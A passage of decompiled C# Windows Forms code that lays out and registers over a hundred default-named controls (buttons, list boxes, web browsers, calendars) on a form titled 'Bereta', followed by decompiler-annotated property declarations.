			this.DateTimePicker10.Location = new Point(93, 204);
			this.DateTimePicker10.Name = "DateTimePicker10";
			this.DateTimePicker10.Size = new Size(200, 20);
			this.DateTimePicker10.TabIndex = 178;
			this.CheckedListBox20.FormattingEnabled = true;
			this.CheckedListBox20.Location = new Point(274, 54);
			this.CheckedListBox20.Name = "CheckedListBox20";
			this.CheckedListBox20.Size = new Size(120, 94);
			this.CheckedListBox20.TabIndex = 177;
			this.Button10.Location = new Point(127, 66);
			this.Button10.Name = "Button10";
			this.Button10.Size = new Size(75, 23);
			this.Button10.TabIndex = 176;
			this.Button10.Text = "Button10";
			this.Button10.UseVisualStyleBackColor = true;
			this.CheckedListBox21.FormattingEnabled = true;
			this.CheckedListBox21.Location = new Point(179, 62);
			this.CheckedListBox21.Name = "CheckedListBox21";
			this.CheckedListBox21.Size = new Size(120, 94);
			this.CheckedListBox21.TabIndex = 175;
			this.ComboBox21.FormattingEnabled = true;
			this.ComboBox21.Location = new Point(197, 49);
			this.ComboBox21.Name = "ComboBox21";
			this.ComboBox21.Size = new Size(8, 21);
			this.ComboBox21.TabIndex = 174;
			this.ListBox11.FormattingEnabled = true;
			this.ListBox11.Location = new Point(275, 125);
			this.ListBox11.Name = "ListBox11";
			this.ListBox11.Size = new Size(120, 95);
			this.ListBox11.TabIndex = 173;
			this.LinkLabel11.AutoSize = true;
			this.LinkLabel11.Location = new Point(285, 25);
			this.LinkLabel11.Name = "LinkLabel11";
			this.LinkLabel11.Size = new Size(65, 13);
			this.LinkLabel11.TabIndex = 172;
			this.LinkLabel11.TabStop = true;
			this.LinkLabel11.Text = "LinkLabel11";
			this.MaskedTextBox21.Location = new Point(254, 209);
			this.MaskedTextBox21.Name = "MaskedTextBox21";
			this.MaskedTextBox21.Size = new Size(100, 20);
			this.MaskedTextBox21.TabIndex = 171;
			this.ProgressBar11.Location = new Point(273, 257);
			this.ProgressBar11.Name = "ProgressBar11";
			this.ProgressBar11.Size = new Size(100, 23);
			this.ProgressBar11.TabIndex = 170;
			this.PictureBox21.Location = new Point(423, 17);
			this.PictureBox21.Name = "PictureBox21";
			this.PictureBox21.Size = new Size(168, 91);
			this.PictureBox21.TabIndex = 169;
			this.PictureBox21.TabStop = false;
			this.PictureBox22.Location = new Point(423, 79);
			this.PictureBox22.Name = "PictureBox22";
			this.PictureBox22.Size = new Size(8, 8);
			this.PictureBox22.TabIndex = 168;
			this.PictureBox22.TabStop = false;
			this.WebBrowser11.Location = new Point(53, 179);
			this.WebBrowser11.MinimumSize = new Size(20, 20);
			this.WebBrowser11.Name = "WebBrowser11";
			this.WebBrowser11.Size = new Size(62, 57);
			this.WebBrowser11.TabIndex = 167;
			this.TextBox11.Location = new Point(103, 251);
			this.TextBox11.Name = "TextBox11";
			this.TextBox11.Size = new Size(100, 20);
			this.TextBox11.TabIndex = 166;
			this.RichTextBox11.Location = new Point(69, 52);
			this.RichTextBox11.Name = "RichTextBox11";
			this.RichTextBox11.Size = new Size(100, 96);
			this.RichTextBox11.TabIndex = 165;
			this.RichTextBox11.Text = "";
			this.RadioButton8.AutoSize = true;
			this.RadioButton8.Location = new Point(81, -5);
			this.RadioButton8.Name = "RadioButton8";
			this.RadioButton8.Size = new Size(90, 17);
			this.RadioButton8.TabIndex = 164;
			this.RadioButton8.TabStop = true;
			this.RadioButton8.Text = "RadioButton8";
			this.RadioButton8.UseVisualStyleBackColor = true;
			this.NumericUpDown11.Location = new Point(494, 43);
			this.NumericUpDown11.Name = "NumericUpDown11";
			this.NumericUpDown11.Size = new Size(120, 20);
			this.NumericUpDown11.TabIndex = 163;
			this.MonthCalendar11.Location = new Point(467, 112);
			this.MonthCalendar11.Name = "MonthCalendar11";
			this.MonthCalendar11.TabIndex = 162;
			this.MaskedTextBox22.Location = new Point(121, 160);
			this.MaskedTextBox22.Name = "MaskedTextBox22";
			this.MaskedTextBox22.Size = new Size(100, 20);
			this.MaskedTextBox22.TabIndex = 161;
			this.ListView11.HideSelection = false;
			this.ListView11.Location = new Point(368, 188);
			this.ListView11.Name = "ListView11";
			this.ListView11.Size = new Size(121, 97);
			this.ListView11.TabIndex = 160;
			this.ListView11.UseCompatibleStateImageBehavior = false;
			this.Label11.AutoSize = true;
			this.Label11.Location = new Point(212, 17);
			this.Label11.Name = "Label11";
			this.Label11.Size = new Size(45, 13);
			this.Label11.TabIndex = 159;
			this.Label11.Text = "Label11";
			this.ComboBox22.FormattingEnabled = true;
			this.ComboBox22.Location = new Point(503, 79);
			this.ComboBox22.Name = "ComboBox22";
			this.ComboBox22.Size = new Size(121, 21);
			this.ComboBox22.TabIndex = 158;
			this.DateTimePicker11.Location = new Point(101, 216);
			this.DateTimePicker11.Name = "DateTimePicker11";
			this.DateTimePicker11.Size = new Size(200, 20);
			this.DateTimePicker11.TabIndex = 157;
			this.CheckedListBox22.FormattingEnabled = true;
			this.CheckedListBox22.Location = new Point(282, 66);
			this.CheckedListBox22.Name = "CheckedListBox22";
			this.CheckedListBox22.Size = new Size(120, 94);
			this.CheckedListBox22.TabIndex = 156;
			this.CheckBox7.AutoSize = true;
			this.CheckBox7.Location = new Point(408, -11);
			this.CheckBox7.Name = "CheckBox7";
			this.CheckBox7.Size = new Size(81, 17);
			this.CheckBox7.TabIndex = 155;
			this.CheckBox7.Text = "CheckBox7";
			this.CheckBox7.UseVisualStyleBackColor = true;
			this.Button11.Location = new Point(135, 78);
			this.Button11.Name = "Button11";
			this.Button11.Size = new Size(75, 23);
			this.Button11.TabIndex = 154;
			this.Button11.Text = "Button11";
			this.Button11.UseVisualStyleBackColor = true;
			this.CheckedListBox23.FormattingEnabled = true;
			this.CheckedListBox23.Location = new Point(187, 62);
			this.CheckedListBox23.Name = "CheckedListBox23";
			this.CheckedListBox23.Size = new Size(120, 94);
			this.CheckedListBox23.TabIndex = 153;
			this.ComboBox23.FormattingEnabled = true;
			this.ComboBox23.Location = new Point(205, 49);
			this.ComboBox23.Name = "ComboBox23";
			this.ComboBox23.Size = new Size(8, 21);
			this.ComboBox23.TabIndex = 152;
			this.ListBox12.FormattingEnabled = true;
			this.ListBox12.Location = new Point(283, 125);
			this.ListBox12.Name = "ListBox12";
			this.ListBox12.Size = new Size(120, 95);
			this.ListBox12.TabIndex = 151;
			this.LinkLabel12.AutoSize = true;
			this.LinkLabel12.Location = new Point(293, 25);
			this.LinkLabel12.Name = "LinkLabel12";
			this.LinkLabel12.Size = new Size(65, 13);
			this.LinkLabel12.TabIndex = 150;
			this.LinkLabel12.TabStop = true;
			this.LinkLabel12.Text = "LinkLabel12";
			this.MaskedTextBox23.Location = new Point(262, 209);
			this.MaskedTextBox23.Name = "MaskedTextBox23";
			this.MaskedTextBox23.Size = new Size(100, 20);
			this.MaskedTextBox23.TabIndex = 149;
			this.ProgressBar12.Location = new Point(281, 257);
			this.ProgressBar12.Name = "ProgressBar12";
			this.ProgressBar12.Size = new Size(100, 23);
			this.ProgressBar12.TabIndex = 148;
			this.PictureBox23.Location = new Point(431, 17);
			this.PictureBox23.Name = "PictureBox23";
			this.PictureBox23.Size = new Size(168, 91);
			this.PictureBox23.TabIndex = 147;
			this.PictureBox23.TabStop = false;
			this.PictureBox24.Location = new Point(431, 79);
			this.PictureBox24.Name = "PictureBox24";
			this.PictureBox24.Size = new Size(8, 8);
			this.PictureBox24.TabIndex = 146;
			this.PictureBox24.TabStop = false;
			this.WebBrowser12.Location = new Point(61, 179);
			this.WebBrowser12.MinimumSize = new Size(20, 20);
			this.WebBrowser12.Name = "WebBrowser12";
			this.WebBrowser12.Size = new Size(62, 57);
			this.WebBrowser12.TabIndex = 145;
			this.TextBox12.Location = new Point(111, 251);
			this.TextBox12.Name = "TextBox12";
			this.TextBox12.Size = new Size(100, 20);
			this.TextBox12.TabIndex = 144;
			this.RichTextBox12.Location = new Point(77, 52);
			this.RichTextBox12.Name = "RichTextBox12";
			this.RichTextBox12.Size = new Size(100, 96);
			this.RichTextBox12.TabIndex = 143;
			this.RichTextBox12.Text = "";
			this.RadioButton9.AutoSize = true;
			this.RadioButton9.Location = new Point(89, -5);
			this.RadioButton9.Name = "RadioButton9";
			this.RadioButton9.Size = new Size(90, 17);
			this.RadioButton9.TabIndex = 142;
			this.RadioButton9.TabStop = true;
			this.RadioButton9.Text = "RadioButton9";
			this.RadioButton9.UseVisualStyleBackColor = true;
			this.NumericUpDown12.Location = new Point(502, 43);
			this.NumericUpDown12.Name = "NumericUpDown12";
			this.NumericUpDown12.Size = new Size(120, 20);
			this.NumericUpDown12.TabIndex = 141;
			this.MonthCalendar12.Location = new Point(475, 112);
			this.MonthCalendar12.Name = "MonthCalendar12";
			this.MonthCalendar12.TabIndex = 140;
			this.MaskedTextBox24.Location = new Point(129, 160);
			this.MaskedTextBox24.Name = "MaskedTextBox24";
			this.MaskedTextBox24.Size = new Size(100, 20);
			this.MaskedTextBox24.TabIndex = 139;
			this.ListView12.HideSelection = false;
			this.ListView12.Location = new Point(376, 188);
			this.ListView12.Name = "ListView12";
			this.ListView12.Size = new Size(121, 97);
			this.ListView12.TabIndex = 138;
			this.ListView12.UseCompatibleStateImageBehavior = false;
			this.Label12.AutoSize = true;
			this.Label12.Location = new Point(220, 17);
			this.Label12.Name = "Label12";
			this.Label12.Size = new Size(45, 13);
			this.Label12.TabIndex = 137;
			this.Label12.Text = "Label12";
			this.ComboBox24.FormattingEnabled = true;
			this.ComboBox24.Location = new Point(511, 79);
			this.ComboBox24.Name = "ComboBox24";
			this.ComboBox24.Size = new Size(121, 21);
			this.ComboBox24.TabIndex = 136;
			this.DateTimePicker12.Location = new Point(109, 216);
			this.DateTimePicker12.Name = "DateTimePicker12";
			this.DateTimePicker12.Size = new Size(200, 20);
			this.DateTimePicker12.TabIndex = 135;
			this.CheckedListBox24.FormattingEnabled = true;
			this.CheckedListBox24.Location = new Point(290, 66);
			this.CheckedListBox24.Name = "CheckedListBox24";
			this.CheckedListBox24.Size = new Size(120, 94);
			this.CheckedListBox24.TabIndex = 134;
			this.CheckBox8.AutoSize = true;
			this.CheckBox8.Location = new Point(416, -11);
			this.CheckBox8.Name = "CheckBox8";
			this.CheckBox8.Size = new Size(81, 17);
			this.CheckBox8.TabIndex = 133;
			this.CheckBox8.Text = "CheckBox8";
			this.CheckBox8.UseVisualStyleBackColor = true;
			this.Button12.Location = new Point(143, 78);
			this.Button12.Name = "Button12";
			this.Button12.Size = new Size(75, 23);
			this.Button12.TabIndex = 132;
			this.Button12.Text = "Button12";
			this.Button12.UseVisualStyleBackColor = true;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(656, 320);
			base.Controls.Add(this.CheckedListBox13);
			base.Controls.Add(this.ComboBox13);
			base.Controls.Add(this.ListBox7);
			base.Controls.Add(this.LinkLabel7);
			base.Controls.Add(this.MaskedTextBox13);
			base.Controls.Add(this.ProgressBar7);
			base.Controls.Add(this.PictureBox13);
			base.Controls.Add(this.PictureBox14);
			base.Controls.Add(this.WebBrowser7);
			base.Controls.Add(this.TextBox7);
			base.Controls.Add(this.RichTextBox7);
			base.Controls.Add(this.NumericUpDown7);
			base.Controls.Add(this.MonthCalendar7);
			base.Controls.Add(this.MaskedTextBox14);
			base.Controls.Add(this.ListView7);
			base.Controls.Add(this.Label7);
			base.Controls.Add(this.ComboBox14);
			base.Controls.Add(this.DateTimePicker7);
			base.Controls.Add(this.CheckedListBox14);
			base.Controls.Add(this.Button7);
			base.Controls.Add(this.CheckedListBox15);
			base.Controls.Add(this.ComboBox15);
			base.Controls.Add(this.ListBox8);
			base.Controls.Add(this.LinkLabel8);
			base.Controls.Add(this.MaskedTextBox15);
			base.Controls.Add(this.ProgressBar8);
			base.Controls.Add(this.PictureBox15);
			base.Controls.Add(this.PictureBox16);
			base.Controls.Add(this.WebBrowser8);
			base.Controls.Add(this.TextBox8);
			base.Controls.Add(this.RichTextBox8);
			base.Controls.Add(this.NumericUpDown8);
			base.Controls.Add(this.MonthCalendar8);
			base.Controls.Add(this.MaskedTextBox16);
			base.Controls.Add(this.ListView8);
			base.Controls.Add(this.Label8);
			base.Controls.Add(this.ComboBox16);
			base.Controls.Add(this.DateTimePicker8);
			base.Controls.Add(this.CheckedListBox16);
			base.Controls.Add(this.Button8);
			base.Controls.Add(this.CheckedListBox17);
			base.Controls.Add(this.ComboBox17);
			base.Controls.Add(this.ListBox9);
			base.Controls.Add(this.LinkLabel9);
			base.Controls.Add(this.MaskedTextBox17);
			base.Controls.Add(this.ProgressBar9);
			base.Controls.Add(this.PictureBox17);
			base.Controls.Add(this.PictureBox18);
			base.Controls.Add(this.WebBrowser9);
			base.Controls.Add(this.TextBox9);
			base.Controls.Add(this.RichTextBox9);
			base.Controls.Add(this.RadioButton7);
			base.Controls.Add(this.NumericUpDown9);
			base.Controls.Add(this.MonthCalendar9);
			base.Controls.Add(this.MaskedTextBox18);
			base.Controls.Add(this.ListView9);
			base.Controls.Add(this.Label9);
			base.Controls.Add(this.ComboBox18);
			base.Controls.Add(this.DateTimePicker9);
			base.Controls.Add(this.CheckedListBox18);
			base.Controls.Add(this.Button9);
			base.Controls.Add(this.CheckedListBox19);
			base.Controls.Add(this.ComboBox19);
			base.Controls.Add(this.ListBox10);
			base.Controls.Add(this.LinkLabel10);
			base.Controls.Add(this.MaskedTextBox19);
			base.Controls.Add(this.ProgressBar10);
			base.Controls.Add(this.PictureBox19);
			base.Controls.Add(this.PictureBox20);
			base.Controls.Add(this.WebBrowser10);
			base.Controls.Add(this.TextBox10);
			base.Controls.Add(this.RichTextBox10);
			base.Controls.Add(this.NumericUpDown10);
			base.Controls.Add(this.MonthCalendar10);
			base.Controls.Add(this.MaskedTextBox20);
			base.Controls.Add(this.ListView10);
			base.Controls.Add(this.Label10);
			base.Controls.Add(this.ComboBox20);
			base.Controls.Add(this.DateTimePicker10);
			base.Controls.Add(this.CheckedListBox20);
			base.Controls.Add(this.Button10);
			base.Controls.Add(this.CheckedListBox21);
			base.Controls.Add(this.ComboBox21);
			base.Controls.Add(this.ListBox11);
			base.Controls.Add(this.LinkLabel11);
			base.Controls.Add(this.MaskedTextBox21);
			base.Controls.Add(this.ProgressBar11);
			base.Controls.Add(this.PictureBox21);
			base.Controls.Add(this.PictureBox22);
			base.Controls.Add(this.WebBrowser11);
			base.Controls.Add(this.TextBox11);
			base.Controls.Add(this.RichTextBox11);
			base.Controls.Add(this.RadioButton8);
			base.Controls.Add(this.NumericUpDown11);
			base.Controls.Add(this.MonthCalendar11);
			base.Controls.Add(this.MaskedTextBox22);
			base.Controls.Add(this.ListView11);
			base.Controls.Add(this.Label11);
			base.Controls.Add(this.ComboBox22);
			base.Controls.Add(this.DateTimePicker11);
			base.Controls.Add(this.CheckedListBox22);
			base.Controls.Add(this.CheckBox7);
			base.Controls.Add(this.Button11);
			base.Controls.Add(this.CheckedListBox23);
			base.Controls.Add(this.ComboBox23);
			base.Controls.Add(this.ListBox12);
			base.Controls.Add(this.LinkLabel12);
			base.Controls.Add(this.MaskedTextBox23);
			base.Controls.Add(this.ProgressBar12);
			base.Controls.Add(this.PictureBox23);
			base.Controls.Add(this.PictureBox24);
			base.Controls.Add(this.WebBrowser12);
			base.Controls.Add(this.TextBox12);
			base.Controls.Add(this.RichTextBox12);
			base.Controls.Add(this.RadioButton9);
			base.Controls.Add(this.NumericUpDown12);
			base.Controls.Add(this.MonthCalendar12);
			base.Controls.Add(this.MaskedTextBox24);
			base.Controls.Add(this.ListView12);
			base.Controls.Add(this.Label12);
			base.Controls.Add(this.ComboBox24);
			base.Controls.Add(this.DateTimePicker12);
			base.Controls.Add(this.CheckedListBox24);
			base.Controls.Add(this.CheckBox8);
			base.Controls.Add(this.Button12);
			base.Controls.Add(this.CheckedListBox11);
			base.Controls.Add(this.ComboBox11);
			base.Controls.Add(this.ListBox6);
			base.Controls.Add(this.LinkLabel6);
			base.Controls.Add(this.MaskedTextBox11);
			base.Controls.Add(this.ProgressBar6);
			base.Controls.Add(this.PictureBox11);
			base.Controls.Add(this.PictureBox12);
			base.Controls.Add(this.WebBrowser6);
			base.Controls.Add(this.TextBox6);
			base.Controls.Add(this.RichTextBox6);
			base.Controls.Add(this.RadioButton6);
			base.Controls.Add(this.NumericUpDown6);
			base.Controls.Add(this.MonthCalendar6);
			base.Controls.Add(this.MaskedTextBox12);
			base.Controls.Add(this.ListView6);
			base.Controls.Add(this.Label6);
			base.Controls.Add(this.ComboBox12);
			base.Controls.Add(this.DateTimePicker6);
			base.Controls.Add(this.CheckedListBox12);
			base.Controls.Add(this.CheckBox6);
			base.Controls.Add(this.Button6);
			base.Controls.Add(this.CheckedListBox9);
			base.Controls.Add(this.ComboBox9);
			base.Controls.Add(this.ListBox5);
			base.Controls.Add(this.LinkLabel5);
			base.Controls.Add(this.MaskedTextBox9);
			base.Controls.Add(this.ProgressBar5);
			base.Controls.Add(this.PictureBox9);
			base.Controls.Add(this.PictureBox10);
			base.Controls.Add(this.WebBrowser5);
			base.Controls.Add(this.TextBox5);
			base.Controls.Add(this.RichTextBox5);
			base.Controls.Add(this.RadioButton5);
			base.Controls.Add(this.NumericUpDown5);
			base.Controls.Add(this.MonthCalendar5);
			base.Controls.Add(this.MaskedTextBox10);
			base.Controls.Add(this.ListView5);
			base.Controls.Add(this.Label5);
			base.Controls.Add(this.ComboBox10);
			base.Controls.Add(this.DateTimePicker5);
			base.Controls.Add(this.CheckedListBox10);
			base.Controls.Add(this.CheckBox5);
			base.Controls.Add(this.Button5);
			base.Controls.Add(this.CheckedListBox7);
			base.Controls.Add(this.ComboBox7);
			base.Controls.Add(this.ListBox4);
			base.Controls.Add(this.LinkLabel4);
			base.Controls.Add(this.MaskedTextBox7);
			base.Controls.Add(this.ProgressBar4);
			base.Controls.Add(this.PictureBox7);
			base.Controls.Add(this.PictureBox8);
			base.Controls.Add(this.WebBrowser4);
			base.Controls.Add(this.TextBox4);
			base.Controls.Add(this.RichTextBox4);
			base.Controls.Add(this.RadioButton4);
			base.Controls.Add(this.NumericUpDown4);
			base.Controls.Add(this.MonthCalendar4);
			base.Controls.Add(this.MaskedTextBox8);
			base.Controls.Add(this.ListView4);
			base.Controls.Add(this.Label4);
			base.Controls.Add(this.ComboBox8);
			base.Controls.Add(this.DateTimePicker4);
			base.Controls.Add(this.CheckedListBox8);
			base.Controls.Add(this.CheckBox4);
			base.Controls.Add(this.Button4);
			base.Controls.Add(this.CheckedListBox5);
			base.Controls.Add(this.ComboBox5);
			base.Controls.Add(this.ListBox3);
			base.Controls.Add(this.LinkLabel3);
			base.Controls.Add(this.MaskedTextBox5);
			base.Controls.Add(this.ProgressBar3);
			base.Controls.Add(this.PictureBox5);
			base.Controls.Add(this.PictureBox6);
			base.Controls.Add(this.WebBrowser3);
			base.Controls.Add(this.TextBox3);
			base.Controls.Add(this.RichTextBox3);
			base.Controls.Add(this.RadioButton3);
			base.Controls.Add(this.NumericUpDown3);
			base.Controls.Add(this.MonthCalendar3);
			base.Controls.Add(this.MaskedTextBox6);
			base.Controls.Add(this.ListView3);
			base.Controls.Add(this.Label3);
			base.Controls.Add(this.ComboBox6);
			base.Controls.Add(this.DateTimePicker3);
			base.Controls.Add(this.CheckedListBox6);
			base.Controls.Add(this.CheckBox3);
			base.Controls.Add(this.Button3);
			base.Controls.Add(this.CheckedListBox3);
			base.Controls.Add(this.ComboBox3);
			base.Controls.Add(this.ListBox2);
			base.Controls.Add(this.LinkLabel2);
			base.Controls.Add(this.MaskedTextBox3);
			base.Controls.Add(this.ProgressBar2);
			base.Controls.Add(this.PictureBox3);
			base.Controls.Add(this.PictureBox4);
			base.Controls.Add(this.WebBrowser2);
			base.Controls.Add(this.TextBox2);
			base.Controls.Add(this.RichTextBox2);
			base.Controls.Add(this.RadioButton2);
			base.Controls.Add(this.NumericUpDown2);
			base.Controls.Add(this.MonthCalendar2);
			base.Controls.Add(this.MaskedTextBox4);
			base.Controls.Add(this.ListView2);
			base.Controls.Add(this.Label2);
			base.Controls.Add(this.ComboBox4);
			base.Controls.Add(this.DateTimePicker2);
			base.Controls.Add(this.CheckedListBox4);
			base.Controls.Add(this.CheckBox2);
			base.Controls.Add(this.Button2);
			base.Controls.Add(this.CheckedListBox2);
			base.Controls.Add(this.ComboBox2);
			base.Controls.Add(this.ListBox1);
			base.Controls.Add(this.LinkLabel1);
			base.Controls.Add(this.MaskedTextBox2);
			base.Controls.Add(this.ProgressBar1);
			base.Controls.Add(this.PictureBox2);
			base.Controls.Add(this.PictureBox1);
			base.Controls.Add(this.WebBrowser1);
			base.Controls.Add(this.TextBox1);
			base.Controls.Add(this.RichTextBox1);
			base.Controls.Add(this.RadioButton1);
			base.Controls.Add(this.NumericUpDown1);
			base.Controls.Add(this.MonthCalendar1);
			base.Controls.Add(this.MaskedTextBox1);
			base.Controls.Add(this.ListView1);
			base.Controls.Add(this.Label1);
			base.Controls.Add(this.ComboBox1);
			base.Controls.Add(this.DateTimePicker1);
			base.Controls.Add(this.CheckedListBox1);
			base.Controls.Add(this.CheckBox1);
			base.Controls.Add(this.Button1);
			base.Name = "Bereta";
			this.Text = "Bereta";
			((ISupportInitialize)this.NumericUpDown1).EndInit();
			((ISupportInitialize)this.PictureBox1).EndInit();
			((ISupportInitialize)this.PictureBox2).EndInit();
			((ISupportInitialize)this.PictureBox3).EndInit();
			((ISupportInitialize)this.PictureBox4).EndInit();
			((ISupportInitialize)this.NumericUpDown2).EndInit();
			((ISupportInitialize)this.PictureBox5).EndInit();
			((ISupportInitialize)this.PictureBox6).EndInit();
			((ISupportInitialize)this.NumericUpDown3).EndInit();
			((ISupportInitialize)this.PictureBox7).EndInit();
			((ISupportInitialize)this.PictureBox8).EndInit();
			((ISupportInitialize)this.NumericUpDown4).EndInit();
			((ISupportInitialize)this.PictureBox9).EndInit();
			((ISupportInitialize)this.PictureBox10).EndInit();
			((ISupportInitialize)this.NumericUpDown5).EndInit();
			((ISupportInitialize)this.PictureBox11).EndInit();
			((ISupportInitialize)this.PictureBox12).EndInit();
			((ISupportInitialize)this.NumericUpDown6).EndInit();
			((ISupportInitialize)this.PictureBox13).EndInit();
			((ISupportInitialize)this.PictureBox14).EndInit();
			((ISupportInitialize)this.NumericUpDown7).EndInit();
			((ISupportInitialize)this.PictureBox15).EndInit();
			((ISupportInitialize)this.PictureBox16).EndInit();
			((ISupportInitialize)this.NumericUpDown8).EndInit();
			((ISupportInitialize)this.PictureBox17).EndInit();
			((ISupportInitialize)this.PictureBox18).EndInit();
			((ISupportInitialize)this.NumericUpDown9).EndInit();
			((ISupportInitialize)this.PictureBox19).EndInit();
			((ISupportInitialize)this.PictureBox20).EndInit();
			((ISupportInitialize)this.NumericUpDown10).EndInit();
			((ISupportInitialize)this.PictureBox21).EndInit();
			((ISupportInitialize)this.PictureBox22).EndInit();
			((ISupportInitialize)this.NumericUpDown11).EndInit();
			((ISupportInitialize)this.PictureBox23).EndInit();
			((ISupportInitialize)this.PictureBox24).EndInit();
			((ISupportInitialize)this.NumericUpDown12).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06000019 RID: 25 RVA: 0x00009916 File Offset: 0x00007B16
		// (set) Token: 0x0600001A RID: 26 RVA: 0x0000991E File Offset: 0x00007B1E
		internal virtual Button Button1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x0600001B RID: 27 RVA: 0x00009927 File Offset: 0x00007B27
		// (set) Token: 0x0600001C RID: 28 RVA: 0x0000992F File Offset: 0x00007B2F
		internal virtual CheckBox CheckBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x0600001D RID: 29 RVA: 0x00009938 File Offset: 0x00007B38
		// (set) Token: 0x0600001E RID: 30 RVA: 0x00009940 File Offset: 0x00007B40
		internal virtual CheckedListBox CheckedListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x0600001F RID: 31 RVA: 0x00009949 File Offset: 0x00007B49
		// (set) Token: 0x06000020 RID: 32 RVA: 0x00009951 File Offset: 0x00007B51
		internal virtual DateTimePicker DateTimePicker1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000021 RID: 33 RVA: 0x0000995A File Offset: 0x00007B5A
		// (set) Token: 0x06000022 RID: 34 RVA: 0x00009962 File Offset: 0x00007B62
		internal virtual ComboBox ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000023 RID: 35 RVA: 0x0000996B File Offset: 0x00007B6B
		// (set) Token: 0x06000024 RID: 36 RVA: 0x00009973 File Offset: 0x00007B73
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000025 RID: 37 RVA: 0x0000997C File Offset: 0x00007B7C
		// (set) Token: 0x06000026 RID: 38 RVA: 0x00009984 File Offset: 0x00007B84
		internal virtual ListView ListView1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000027 RID: 39 RVA: 0x0000998D File Offset: 0x00007B8D
		// (set) Token: 0x06000028 RID: 40 RVA: 0x00009995 File Offset: 0x00007B95
		internal virtual MaskedTextBox MaskedTextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000029 RID: 41 RVA: 0x0000999E File Offset: 0x00007B9E
		// (set) Token: 0x0600002A RID: 42 RVA: 0x000099A6 File Offset: 0x00007BA6
		internal virtual MonthCalendar MonthCalendar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x0600002B RID: 43 RVA: 0x000099AF File Offset: 0x00007BAF
		// (set) Token: 0x0600002C RID: 44 RVA: 0x000099B7 File Offset: 0x00007BB7
		internal virtual NumericUpDown NumericUpDown1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x0600002D RID: 45 RVA: 0x000099C0 File Offset: 0x00007BC0
		// (set) Token: 0x0600002E RID: 46 RVA: 0x000099C8 File Offset: 0x00007BC8
		internal virtual RadioButton RadioButton1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x0600002F RID: 47 RVA: 0x000099D1 File Offset: 0x00007BD1
		// (set) Token: 0x06000030 RID: 48 RVA: 0x000099D9 File Offset: 0x00007BD9
		internal virtual RichTextBox RichTextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x06000031 RID: 49 RVA: 0x000099E2 File Offset: 0x00007BE2
		// (set) Token: 0x06000032 RID: 50 RVA: 0x000099EA File Offset: 0x00007BEA
		internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x06000033 RID: 51 RVA: 0x000099F3 File Offset: 0x00007BF3
		// (set) Token: 0x06000034 RID: 52 RVA: 0x000099FB File Offset: 0x00007BFB
		internal virtual WebBrowser WebBrowser1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x06000035 RID: 53 RVA: 0x00009A04 File Offset: 0x00007C04
		// (set) Token: 0x06000036 RID: 54 RVA: 0x00009A0C File Offset: 0x00007C0C
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000037 RID: 55 RVA: 0x00009A15 File Offset: 0x00007C15
		// (set) Token: 0x06000038 RID: 56 RVA: 0x00009A1D File Offset: 0x00007C1D
		internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000039 RID: 57 RVA: 0x00009A26 File Offset: 0x00007C26
		// (set) Token: 0x0600003A RID: 58 RVA: 0x00009A2E File Offset: 0x00007C2E
		internal virtual ProgressBar ProgressBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x0600003B RID: 59 RVA: 0x00009A37 File Offset: 0x00007C37
		// (set) Token: 0x0600003C RID: 60 RVA: 0x00009A3F File Offset: 0x00007C3F
		internal virtual MaskedTextBox MaskedTextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x0600003D RID: 61 RVA: 0x00009A48 File Offset: 0x00007C48
		// (set) Token: 0x0600003E RID: 62 RVA: 0x00009A50 File Offset: 0x00007C50
		internal virtual LinkLabel LinkLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x0600003F RID: 63 RVA: 0x00009A59 File Offset: 0x00007C59
		// (set) Token: 0x06000040 RID: 64 RVA: 0x00009A61 File Offset: 0x00007C61
		internal virtual ListBox ListBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x06000041 RID: 65 RVA: 0x00009A6A File Offset: 0x00007C6A
		// (set) Token: 0x06000042 RID: 66 RVA: 0x00009A72 File Offset: 0x00007C72
